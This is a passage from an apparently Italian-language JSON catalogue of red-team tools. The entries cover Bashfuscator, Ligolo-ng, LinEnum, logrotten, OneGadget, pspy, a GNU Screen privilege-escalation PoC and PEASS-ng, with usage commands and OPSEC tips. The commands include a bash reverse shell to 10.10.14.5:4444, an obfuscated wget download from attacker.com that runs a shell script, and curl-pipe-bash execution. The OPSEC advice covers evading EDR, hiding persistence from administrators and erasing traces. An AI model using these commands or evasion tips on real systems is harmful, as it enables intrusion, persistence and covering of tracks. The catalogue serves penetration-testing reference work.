    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Bashfuscator</strong> è un framework di offuscamento per script Bash e comandi shell Linux. Trasforma comandi e script in versioni funzionalmente identiche ma completamente illeggibili, bypassando analisi statiche, firme IDS/IPS e controlli di sicurezza basati su keyword matching. Il tool implementa un'architettura modulare con diversi \"mutatori\" che applicano tecniche di offuscamento indipendenti e combinabili in layer multipli. Ogni esecuzione produce un output diverso (polimorfismo), rendendo inutile la creazione di signature hash statiche. Bashfuscator è particolarmente utile in ambienti Linux dove gli EDR ispezionano i comandi eseguiti via auditd o monitorano il contenuto degli script scaricati, poiché le keyword critiche (<code>wget</code>, <code>curl</code>, <code>nc -e</code>, <code>/etc/shadow</code>) vengono frammentate e ricostruite a runtime.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mutatori Multi-Layer:</strong> Il framework offre diversi tipi di mutatori che possono essere combinati in stack. I mutatori di tipo \"string\" spezzano i comandi in variabili frammentate e li riassemblano a runtime (es. <code>a=\"ca\"; b=\"t /e\"; c=\"tc/pa\"; d=\"sswd\"; $a$b$c$d</code>). I mutatori \"encoding\" applicano strati di codifica (Base64, hex, octal, brace expansion) che vengono decodificati dallo script stesso. I mutatori \"compress\" comprimono il payload con gzip/bzip2 e lo decomprimono in pipe a bash.</p><p><strong>Polimorfismo & Randomizzazione:</strong> Ogni esecuzione del tool produce un output completamente diverso, anche per lo stesso input. I nomi delle variabili, l'ordine dei frammenti, i metodi di encoding e la struttura del decodificatore vengono randomizzati. Questo rende impossibile la creazione di firme statiche e complica significativamente l'analisi manuale da parte degli analisti SOC.</p><p><strong>Modalità Interattiva e CLI:</strong> Può essere usato sia in modalità interattiva (selezione guidata dei mutatori con preview del risultato) che in modalità CLI per l'integrazione in pipeline di payload generation automatizzate. Supporta l'offuscamento di singoli comandi, file script completi e input da stdin.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Bashfuscator richiede Python 3 e Bash. L'installazione avviene tramite pip. I comandi possono essere passati inline o da file. Il livello di offuscamento è controllato dal numero di layer e dal tipo di mutatori selezionati.</p><pre><code># Offuscamento di un one-liner con output su file\nbashfuscator -c \"cat /etc/passwd\" -o payload.sh\n\n# Offuscamento di uno script completo con 2 layer random\nbashfuscator -f reverse_shell.sh -l 2 --choose-mutators random -o obfuscated.sh\n\n# Offuscamento con mutatore specifico (token manipulation)\nbashfuscator -c \"wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh\" --choose-mutators token/special_char_only\n\n# Modalità interattiva per selezione guidata\nbashfuscator --interactive</code></pre><p>È importante testare sempre lo script offuscato in un ambiente di laboratorio prima del deployment, poiché layer eccessivi possono causare incompatibilità con versioni specifiche di Bash o aumentare il tempo di decodifica a runtime.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In operazioni di <strong>Red Teaming su Linux</strong>, Bashfuscator è essenziale per nascondere payload di reverse shell, script di persistenza e comandi di post-exploitation dall'ispezione da parte di EDR Linux (Falcon, SentinelOne per Linux, Wazuh) che monitorano i comandi eseguiti tramite audit framework. Le keyword critiche vengono frammentate rendendo inefficaci le regole di detection basate su pattern matching.</p><p>Per il <strong>Bypass di WAF e Filtri</strong>, in scenari di command injection dove il server filtra keyword specifiche (<code>cat</code>, <code>ls</code>, <code>wget</code>), l'offuscamento permette di eseguire gli stessi comandi in forme non riconoscibili dai filtri, bypassando le blacklist senza dover ricorrere a comandi alternativi.</p><p>Durante lo sviluppo di <strong>Payload di Persistenza</strong>, gli script cron job o init script offuscati sono più resistenti all'analisi manuale da parte degli amministratori di sistema durante le attività di hardening o incident response, prolungando la durata dell'accesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli script offuscati presentano caratteristiche riconoscibili: entropia molto alta del contenuto, uso massiccio di <code>eval</code>, <code>echo -e</code> e pipe a <code>bash</code>, variabili con nomi casuali e strutture sintatiche anomale. Gli EDR moderni con capacità di analisi euristica possono flaggare questi pattern come \"obfuscated script execution\" indipendentemente dal contenuto effettivo. Auditd logga comunque il comando <code>bash payload.sh</code> anche se il contenuto è offuscato.</p><p><strong>Impatto operativo:</strong> Script con molti layer di offuscamento possono richiedere secondi per la decodifica a runtime, generando un ritardo percepibile. Layer eccessivi possono anche superare i limiti di dimensione dei comandi shell o causare errori su versioni di Bash non recenti.</p><p><strong>Mitigazioni:</strong> Usare il minor numero di layer necessario per bypassare il controllo specifico. Testare in laboratorio con la stessa versione di Bash del target. Preferire mutatori \"string\" rispetto a \"encoding\" quando possibile, poiché generano output con entropia più bassa e meno sospetta. Eliminare lo script offuscato dal disco dopo l'esecuzione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "ligolo-ng",
    "name": "Ligolo-ng",
    "version": "0.8.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nicocha30/ligolo-ng",
    "desc": "Tool di tunneling/pivoting moderno che usa interfacce TUN per routing completo (TCP/UDP/ICMP) senza bisogno di SOCKS proxy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ligolo-ng</strong> rappresenta l'evoluzione del pivoting. A differenza dei tradizionali proxy SOCKS (come Chisel o SSH -D) che gestiscono solo connessioni TCP e richiedono \"proxychains\", Ligolo-ng crea un'interfaccia di rete virtuale (TUN) sulla macchina dell'attaccante. Questo permette di instradare <strong>tutto</strong> il traffico di rete (inclusi SYN scan, UDP, ICMP ping) verso la rete interna compromessa in modo trasparente, come se si fosse collegati in VPN.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Full VPN-like Experience:</strong> Permette di usare tool come Nmap (con OS detection), Masscan o Kerberos tools senza wrapper o configurazioni proxy complesse.</p><p><strong>User-Space Execution:</strong> L'agent sul target gira in user-space (non richiede driver o privilegi amministrativi per funzionare, anche se privilegiati servono per alcune feature di rete avanzate).</p><p><strong>Reverse Tunneling:</strong> L'agent si connette al proxy dell'attaccante, bypassando firewall che bloccano connessioni in ingresso (bind shells).</p><p><strong>Certificati Let's Encrypt:</strong> Supporta gestione automatica certificati SSL per cifrare il traffico del tunnel e mascherarlo come HTTPS legittimo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Setup: Proxy sulla macchina attaccante, Agent sulla vittima.</p><pre><code># Attaccante (Setup interfaccia e listener)\nsudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert\n\n# Vittima (Connect back)\n./agent -connect attacker_ip:11601 -ignore-cert\n\n# Attaccante (Nella console ligolo)\nsession 1\nstart\n# Aggiunta rotta sul sistema attaccante\nsudo ip route add 192.168.50.0/24 dev ligolo</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard de facto per <strong>Deep Network Pivoting</strong>. Se comprometti un server web esposto e vuoi scansionare la rete interna database con Nmap <code>-sS</code> (SYN scan) o eseguire attacchi UDP (es. Kerberoasting, SNMP), Ligolo-ng è superiore a qualsiasi proxy SOCKS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico è cifrato (TLS), ma una connessione persistente a lungo termine verso un IP esterno è sospetta (Beaconing). L'agent in memoria è un eseguibile Go che può essere firmato da EDR.</p><p><strong>Mitigazioni:</strong> Usare redirector https legittimi davanti al proxy. Rinominare l'agent.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "linenum",
    "name": "LinEnum",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/rebootuser/LinEnum",
    "desc": "Script Bash per privilege escalation enumeration su Linux: verifica kernel, SUID/GUID, cron jobs, config files e permessi errati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LinEnum</strong> è uno dei primi e più diffusi script di enumerazione automatica per sistemi Linux. Esegue una batteria di oltre 60 controlli per identificare vettori comuni di escalation dei privilegi locali. È progettato per essere eseguito \"senza installazione\" (basta lo script bash) e fornisce un report dettagliato evidenziando (in giallo/rosso/magenta) le configurazioni più promettenti per ottenere root.</p><br><hr><h4 class=\"rt-purple\">Controlli principali</h4><p><strong>Kernel & Distribution:</strong> Identifica versione OS e Kernel per cercare exploit locali noti (es. DirtyCow).</p><p><strong>Permessi & Capabilities:</strong> Cerca file con bit SUID/SGID attivi, file scrivibili da \"world\" o gruppo, e capabilities POSIX anomale assegnate a eseguibili.</p><p><strong>Servizi & Job:</strong> Enumera processi girano come root, cron job (task pianificati) leggibili o modificabili, e timer di systemd.</p><p><strong>Credenziali:</strong> Cerca password in chiaro in file di config, history della shell, chiavi SSH e file <code>.plan</code>.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Copiare lo script sul target ed eseguirlo. Non richiede privilegi root.</p><pre><code># Esecuzione base con output a video\n./LinEnum.sh\n\n# Esecuzione approfondita (keyword search, test extra) e output file\n./LinEnum.sh -k password -e /tmp/ -t -r report.txt\n\n# Esecuzione memory-only (via curl)\ncurl -L https://raw.githubusercontent.com/.../LinEnum.sh | bash</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il primo step dopo aver ottenuto una shell <strong>Low Privilege</strong> su Linux. Risolve il problema del \"non so cosa cercare\", fornendo in pochi secondi una lista di potenziali vulnerabilità (es. un binario SUID di <code>nmap</code> vecchio, o un cron job che esegue uno script scrivibile dal tuo utente).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> LinEnum tocca migliaia di file in pochi secondi (scan filesystem). Questo genera un picco di I/O e accessi (atime updates) estremamente rumoroso. I comandi eseguiti finiscono nell'audit log.</p><p><strong>Mitigazioni:</strong> In ambienti monitorati, eseguire controlli manuali mirati invece dello script completo. Usare la redirezione output su <code>/dev/shm</code> (RAM disk) per evitare scritture su disco fisico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "logrotten-2-1",
    "name": "logrotten",
    "version": "2.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/whotwagner/logrotten",
    "desc": "Exploit PoC per race condition in logrotate che permette Privilege Escalation da utente log a root.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Logrotten</strong> è un exploit Proof-of-Concept per una vulnerabilità di race condition nel tool di sistema <code>logrotate</code> (CVE-2019-10234 e correlate), presente sulla maggior parte delle distribuzioni Linux. Logrotate è un'utility che gira come root tramite cron job (tipicamente giornaliero) e si occupa di ruotare, comprimere e gestire i file di log. La vulnerabilità si manifesta quando logrotate opera su file di log in directory dove l'utente ha permessi di scrittura: durante la finestra temporale in cui logrotate rinomina o sposta il file di log, un attaccante può sfruttare la race condition per sostituire il file con un symlink verso una directory di sistema (es. <code>/etc/bash_completion.d/</code>), facendo sì che logrotate scriva il payload controllato dall'attaccante in quella directory con privilegi root. Il risultato è l'esecuzione di codice arbitrario come root al prossimo login o evento di sistema.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Race Condition Exploitation:</strong> Il tool monitora continuamente il file di log target usando inotify. Quando rileva che logrotate ha iniziato l'operazione di rotazione (rename del file), interviene nell'intervallo di tempo tra il rename e la creazione del nuovo file vuoto per sostituire il percorso con un symlink verso la directory di destinazione del payload. La finestra temporale è molto stretta (millisecondi) ma l'exploit è progettato per vincerla in modo affidabile.</p><p><strong>Payload Delivery:</strong> Il payload è uno script shell fornito dall'attaccante che viene scritto nella directory target (es. <code>/etc/bash_completion.d/</code>) tramite il symlink. Una volta in quella directory, lo script viene eseguito automaticamente come root al prossimo login di qualsiasi utente (per bash_completion.d) o al prossimo avvio del servizio (per altre directory). Il payload tipico è una reverse shell o un comando che aggiunge l'utente corrente a sudoers.</p><p><strong>Modalità di Attacco Multiple:</strong> Supporta sia la modalità \"classica\" (con symlink durante la rotazione) che varianti che sfruttano la direttiva <code>create</code> di logrotate per scrivere file con permessi specifici in directory controllate. Funziona sia con rotazione standard che con la direttiva <code>copytruncate</code>.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'exploit richiede la compilazione del sorgente C direttamente sul target (o cross-compilazione). Necessita che l'utente corrente abbia permessi di scrittura sulla directory contenente il file di log gestito da logrotate, e che logrotate sia configurato per processare quel file.</p><pre><code># Compilazione dell'exploit\ngcc logrotten.c -o logrotten\n\n# Preparazione del payload (es. reverse shell)\necho '#!/bin/bash\\nbash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > payload.sh\n\n# Esecuzione dell'exploit (attende la rotazione dei log)\n./logrotten -p ./payload.sh /var/log/app/application.log\n\n# Forzare la rotazione manualmente (se si ha accesso)\nsudo logrotate -f /etc/logrotate.d/application</code></pre><p>Se non si può forzare la rotazione, è necessario attendere il cron job giornaliero di logrotate (tipicamente alle 00:00 o 06:25 a seconda della distribuzione). È possibile anche generare traffico verso l'applicazione per far crescere rapidamente il file di log e trigger la rotazione basata sulla dimensione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Linux Privilege Escalation</strong>, logrotten è utile quando si ha accesso come utente di servizio (es. <code>www-data</code>, <code>mysql</code>, <code>tomcat</code>) che ha permessi di scrittura sui propri file di log. Questa condizione è comune: molte applicazioni scrivono log in directory del proprio utente di servizio, e logrotate è quasi sempre configurato per gestirli come root.</p><p>Durante un <strong>Penetration Test</strong>, l'exploit è particolarmente rilevante su server dove gli altri vettori di privilege escalation classici (SUID, capabilities, sudo misconfig, kernel exploit) non sono disponibili. La presenza di logrotate è quasi garantita su qualsiasi sistema Linux enterprise.</p><p>Per il <strong>Security Assessment</strong>, verificare la vulnerabilità a logrotten è un check importante: la mitigazione richiede che le directory dei log non siano scrivibili dall'utente di servizio, o l'aggiornamento di logrotate a versioni patchate che usano <code>fchmodat()</code> con flag <code>AT_SYMLINK_NOFOLLOW</code>.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'exploit richiede l'esecuzione di un binario compilato sul target, che può essere rilevato da EDR. Il monitoraggio di inotify sul file di log può essere visibile. La creazione di symlink in directory di log e la comparsa di file script in <code>/etc/bash_completion.d/</code> o directory simili sono artefatti forensi evidenti. L'exploit potrebbe fallire più volte prima di vincere la race condition, generando file corrotti o parziali.</p><p><strong>Impatto operativo:</strong> Se la race condition viene persa, il file di log originale potrebbe essere corrotto o sovrascritto, causando la perdita di log applicativi. In rari casi, la manipolazione dei symlink durante la rotazione può causare comportamenti imprevedibili di logrotate.</p><p><strong>Mitigazioni:</strong> Compilare l'exploit localmente con un nome non sospetto. Pulire immediatamente il payload dalla directory di sistema dopo l'escalation. Ripristinare il file di log originale se possibile. Verificare prima in laboratorio con la stessa versione di logrotate del target per evitare tentativi falliti rumorosi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "one-gadget-1-10-0",
    "name": "OneGadget",
    "version": "1.10.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/david942j/one_gadget",
    "desc": "Tool per binary exploitation che trova indirizzi ROP nella libc per eseguire execve('/bin/sh') con un singolo salto.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>OneGadget</strong> è uno strumento fondamentale per lo sviluppo di exploit su Linux, ampiamente utilizzato in CTF e penetration testing reale. Scritto in Ruby, cerca all'interno di una libreria <code>libc</code> condivisa gli offset di specifici frammenti di codice (\"gadget\") che, se eseguiti, portano direttamente all'esecuzione di <code>execve(\"/bin/sh\", NULL, NULL)</code>. Questo semplifica drasticamente la costruzione di catene ROP: anziché concatenare decine di gadget per preparare registri e stack, è sufficiente un singolo overwrite dell'instruction pointer verso l'offset trovato. OneGadget analizza staticamente il codice assembly della libc identificando sequenze che terminano in una syscall <code>execve</code> con argomenti controllabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Constraint Analysis:</strong> Per ogni gadget trovato, elenca i vincoli sui registri e sullo stack (es. <code>rax == NULL</code>, <code>[rsp+0x70] == NULL</code>) che devono essere soddisfatti al momento del salto affinché l'exploit funzioni correttamente. Questo permette di scegliere il gadget più compatibile con lo stato dei registri al punto di hijack.</p><p><strong>Multi-Architecture:</strong> Supporta libc compilate per architetture x86, x86_64 e ARM, coprendo la maggior parte degli scenari di exploitation su Linux.</p><p><strong>Build ID Lookup:</strong> Può cercare gadget tramite il Build ID della libc, utile quando si conosce solo l'hash univoco della libreria ma non si ha il file locale. Integra il database di libc-database per risolvere automaticamente le versioni.</p><p><strong>Output Programmabile:</strong> L'output può essere facilmente parsato da script Python (pwntools) per automatizzare la selezione del gadget migliore durante lo sviluppo dell'exploit.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Installazione tramite gem Ruby ed esecuzione contro il file .so della libc target.</p><pre><code># Installazione\ngem install one_gadget\n\n# Trova gadget nella libc locale\none_gadget /lib/x86_64-linux-gnu/libc.so.6\n\n# Cerca tramite Build ID\none_gadget -b 2a451ac31d1b4175e1d7de0c0b1e1917\n\n# Output raw (solo offset, utile per scripting)\none_gadget /path/to/libc.so.6 --raw\n\n# Specificare livello di ricerca (più profondo = più gadget ma più lento)\none_gadget /path/to/libc.so.6 --level 1</code></pre><p>Output esempio: <code>0x4f322 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp &amp; 0xf == 0, rcx == NULL</code>. Ogni riga rappresenta un gadget diverso con il suo offset e i vincoli necessari.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Binary Exploitation (CTF):</strong> Scenario classico: si ha un buffer overflow e un leak dell'indirizzo base della libc. Anziché costruire una catena ROP completa (pop rdi, /bin/sh, system), si usa l'offset di OneGadget per saltare direttamente a una shell con un singolo write.</p><p><strong>Heap Exploitation:</strong> Nelle tecniche di heap exploitation (fastbin attack, tcache poisoning), dove si ha un write primitivo limitato, OneGadget è spesso l'unica opzione praticabile perché richiede di sovrascrivere un solo puntatore (es. <code>__malloc_hook</code> o <code>__free_hook</code>).</p><p><strong>Format String:</strong> Nelle vulnerabilità format string, dove si può sovrascrivere un indirizzo in GOT con un valore arbitrario, OneGadget fornisce l'indirizzo perfetto da scrivere.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Vincoli:</strong> Non tutti i gadget funzionano in ogni situazione. I constraint sui registri devono essere soddisfatti al momento del salto, il che dipende dal contesto specifico dell'exploit. Spesso è necessario provare più gadget prima di trovare quello funzionante.</p><p><strong>Dipendenza dalla libc:</strong> Funziona solo se si conosce o si può leakare la versione esatta della libc del sistema remoto. Versioni diverse hanno offset completamente diversi. Strumenti come <code>libc-database</code> aiutano a identificare la versione da leak parziali.</p><p><strong>ASLR:</strong> Richiede comunque un information leak per calcolare l'indirizzo base della libc nel processo target, dato che ASLR randomizza gli indirizzi ad ogni esecuzione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "pspy",
    "name": "pspy",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/DominicBreuker/pspy",
    "desc": "Monitor di processi Linux senza privilegi di root: intercetta comandi, cron job, uid e guid in tempo reale via procfs.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pspy</strong> è uno strumento di command-line monitoring per Linux progettato per funzionare senza permessi di root. Sfrutta il file system <code>/proc</code> per scansionare continuamente i processi in esecuzione e catturare eventi di breve durata che sfuggirebbero a strumenti statici come <code>ps</code>. È la risorsa primaria per individuare cron job nascosti, script eseguiti da altri utenti e credenziali passate come argomenti da riga di comando.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cron Job Snooping:</strong> Rileva processi che vengono avviati periodicamente (tipico dei cron job). Vedere <em>cosa</em> viene eseguito e <em>con quali privilegi</em> (UID) è fondamentale per trovare vettori di Privilege Escalation (es. un cron job di root che esegue uno script scrivibile).</p><p><strong>Capture Argomenti:</strong> Cattura l'intera riga di comando dei processi. Questo permette di intercettare password, chiavi API o percorsi di file sensibili passati come argomenti a programmi in esecuzione.</p><p><strong>File System Monitoring:</strong> Utilizza <code>inotify</code> per monitorare eventi sul file system (accedibili dall'utente corrente), aiutando a correlare l'esecuzione di processi con la creazione/modifica di file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scaricare il binario statico (disponibile per 32/64 bit) sulla macchina vittima ed eseguirlo.</p><pre><code># Esecuzione standard\n./pspy64\n\n# Monitoraggio specifico su una cartella e output su file\n./pspy64 -f -r /var/www/html -o events.log\n\n# Filtro per PID specifici (es. per monitorare cosa fa un demone)\n./pspy64 -p 1234</code></pre><p>L'output scorre in tempo reale, mostrando PID, UID, e comando completo colorati per leggibilità.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard de facto per la <strong>Linux Privilege Escalation</strong>. Se si è ottenuto un accesso low-privilege, pspy viene lasciato girare per rilevare automazioni di sistema. Esempio classico: rilevare un backup script eseguito ogni minuto da root che usa <code>tar *</code>, sfruttabile tramite wildcard injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> pspy genera un carico CPU notevole a causa del polling continuo su <code>/proc</code>. In ambienti monitorati, questo comportamento anomalo (high CPU usage da un processo sconosciuto) è facilmente rilevabile.</p><p><strong>Mitigazioni:</strong> Usare intervalli di polling più lunghi (flag <code>-i</code>) per ridurre il carico CPU, anche se si rischia di perdere processi molto veloci.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "screen-exploit-poc",
    "name": "screen-exploit-poc.sh",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Bash PoC per sfruttare vulnerabilità di Privilege Escalation locale in GNU Screen (es. CVE-2017-5618).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script Bash è un Proof of Concept per sfruttare la vulnerabilità <strong>CVE-2017-5618</strong> presente in GNU Screen versione 4.5.0 e precedenti. Il binario <code>screen</code> è un terminal multiplexer molto comune su sistemi Linux, e in molte distribuzioni viene installato con il bit <strong>SUID root</strong> per consentire la condivisione di sessioni tra utenti. La vulnerabilità risiede nella funzionalità di logging di Screen: quando un utente attiva il log di una sessione, Screen crea o sovrascrive il file di log con i privilegi di root (grazie al SUID). Questo permette a un attaccante locale di scrivere contenuto arbitrario in qualsiasi file del sistema con permessi di root, ottenendo una completa Privilege Escalation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Arbitrary File Write as Root:</strong> Lo script abusa della funzionalità di logging di Screen per sovrascrivere file critici del sistema. Il vettore principale è la scrittura in <code>/etc/ld.so.preload</code>, un file che specifica librerie condivise da caricare prima di tutte le altre in ogni processo. Inserendo il percorso di una libreria malevola, ogni successivo comando eseguito come root caricherà il codice dell'attaccante.</p><p><strong>Shared Library Injection:</strong> Lo script compila automaticamente una piccola libreria C (<code>.so</code>) che, quando caricata tramite <code>ld.so.preload</code>, esegue codice con privilegi root. Tipicamente questa libreria imposta il SUID su <code>/bin/sh</code> o crea una copia di bash con SUID, fornendo all'attaccante una shell permanente con privilegi root.</p><p><strong>Automazione Completa:</strong> L'intero processo (compilazione della libreria, manipolazione del log di Screen, trigger dell'escalation) è completamente automatizzato nello script Bash, richiedendo zero interazione manuale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Trasferire lo script sulla macchina target e renderlo eseguibile.</p><pre><code># Verificare la versione di screen installata\nscreen --version\n# GNU Screen version 4.05.00 (vulnerabile)\n\n# Verificare che screen sia SUID\nls -la /usr/bin/screen\n# -rwsr-xr-x 1 root root ... /usr/bin/screen\n\n# Eseguire l'exploit\nchmod +x screen-exploit-poc.sh\n./screen-exploit-poc.sh\n# [+] Compiling rootshell.c ...\n# [+] Creating /etc/ld.so.preload ...\n# [+] Triggering privilege escalation ...\n# root@target:~#</code></pre><p>Al termine dell'esecuzione, lo script dovrebbe fornire una shell con privilegi root. In caso di errore, verificare che la versione di Screen sia effettivamente vulnerabile e che il bit SUID sia impostato.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Linux Local Privilege Escalation:</strong> Utilizzato durante penetration test e CTF quando si scopre una versione vulnerabile di Screen sul sistema target. È uno dei check standard eseguiti dopo l'enumerazione iniziale con strumenti come LinPEAS, che segnala automaticamente i binari SUID presenti.</p><p><strong>Legacy System Exploitation:</strong> Molti sistemi non aggiornati (Debian 8, Ubuntu 16.04 e precedenti) possono ancora avere versioni vulnerabili di Screen installate. Utile anche su sistemi embedded o appliance dove gli aggiornamenti sono rari.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Impatto sul sistema:</strong> La modifica di <code>/etc/ld.so.preload</code> è estremamente invasiva: ogni processo del sistema caricherà la libreria iniettata. Se la libreria contiene errori o non è compatibile, può causare il crash di tutti i processi, rendendo il sistema inutilizzabile. È fondamentale ripulire il file dopo l'exploit.</p><p><strong>Rilevamento:</strong> La modifica di <code>/etc/ld.so.preload</code> è monitorata da AIDE, OSSEC e altri sistemi di file integrity monitoring. Inoltre, la compilazione di file C sulla macchina target lascia artefatti forensi evidenti (file .c, .so, e output di gcc nei log).</p><p><strong>Pulizia:</strong> Dopo aver ottenuto la shell root, rimuovere immediatamente <code>/etc/ld.so.preload</code> e la libreria compilata per evitare instabilità del sistema e ridurre le tracce.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "peass-ng",
    "name": "PEASS-ng",
    "version": "20250904-27f4363e",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/peass-ng/PEASS-ng",
    "desc": "Privilege Escalation Awesome Scripts Suite (LinPEAS/WinPEAS): suite definitiva per enumerazione automatica vettori di privesc.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PEASS-ng</strong> è la raccolta standard de-facto per l'enumerazione locale post-exploitation. Include <strong>LinPEAS</strong> (Linux) e <strong>WinPEAS</strong> (Windows). Questi script eseguono una scansione esaustiva del sistema alla ricerca di misconfigurazioni, file sensibili, credenziali, vulnerabilità kernel e servizi sfruttabili per elevare i privilegi da utente standard a Root/SYSTEM. L'output colorato facilita l'identificazione immediata delle criticità (Rosso/Giallo = alta probabilità).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive Checks:</strong> Verifica migliaia di vettori: permessi file, SUID, sudo rights, registry keys, servizi non quotati, DLL hijacking, processi in ascolto, versioni software vulnerabili.</p><p><strong>Credential Hunting:</strong> Cerca aggressivamente password in file di config, cronologia, database locali e memory dump.</p><p><strong>Cloud Awareness:</strong> Rileva se il sistema è in un ambiente cloud (AWS, Azure, GCP) e cerca metadati o credenziali cloud specifiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scaricare ed eseguire lo script sulla macchina target.</p><pre><code># Linux (curl e pipe bash)\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Windows (eseguibile o bat)\nwinpeas.exe domain users\n\n# Modalità stealth/fast\n./linpeas.sh -s (superfast/stealth)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Lo strumento #1 da lanciare dopo aver ottenuto una shell. Risparmia ore di enumerazione manuale. Ottimo anche per <strong>Hardening Audits</strong> per trovare buchi di sicurezza nei propri server.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PEASS è molto rumoroso e conosciuto da tutti gli AV/EDR. LinPEAS tocca troppi file. WinPEAS viene quasi sempre cancellato da Defender.</p><p><strong>Mitigazioni:</strong> Usare versioni offuscate, eseguire solo check specifici o in memoria. In ambienti monitorati, usare l'enumerazione manuale guidata dai risultati di PEASS in lab.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Multi_Platform"
    ],
    "notes": null
  },
  {
    "id": "ghidra-11-4-2-public",
    "name": "Ghidra",
    "version": "11.4.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/NationalSecurityAgency/ghidra",
    "desc": "Suite di Reverse Engineering open-source della NSA: disassembler, decompiler e debugger multi-architettura con scripting Java/Python.",
